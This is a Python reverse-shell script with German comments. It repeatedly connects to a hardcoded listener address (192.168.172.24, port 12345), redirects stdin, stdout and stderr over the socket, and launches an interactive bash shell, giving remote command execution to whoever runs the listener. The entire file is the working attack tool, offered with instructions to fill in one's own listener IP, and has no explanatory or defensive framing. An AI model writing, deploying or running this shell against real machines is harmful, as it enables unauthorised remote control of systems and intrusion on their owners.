import socket
import subprocess
import os

# Konfigurationsparameter
LHOST = "192.168.172.24"  # Ersetze dies durch die IP-Adresse deines Listeners
LPORT = 12345               # Der Port, auf dem dein Listener läuft

def connect_to_listener(lhost, lport):
    """Stellt eine Verbindung zum Listener her."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((lhost, lport))
            return s
        except socket.error:
            # Verbindung fehlgeschlagen, versuchen wir es nach einer kurzen Pause erneut
            pass # Oder füge hier eine kurze Wartezeit ein, z.B. time.sleep(5)

def spawn_shell(s):
    """Spawnt eine Bash-Shell und leitet stdin/stdout/stderr über den Socket um."""
    try:
        # Dupliziere den Socket für stdin, stdout und stderr
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr

        # Führe die Bash-Shell aus
        subprocess.call(["/bin/bash", "-i"])

    except Exception as e:
        # Hier kannst du Fehlerbehandlung hinzufügen, z.B. Logging
        pass
    finally:
        s.close() # Schließe den Socket, wenn die Shell beendet wird oder ein Fehler auftritt

if __name__ == "__main__":
    # Stelle sicher, dass DEINE_LISTENER_IP ersetzt wurde
    sock = connect_to_listener(LHOST, LPORT)
    if sock:
      spawn_shell(sock)
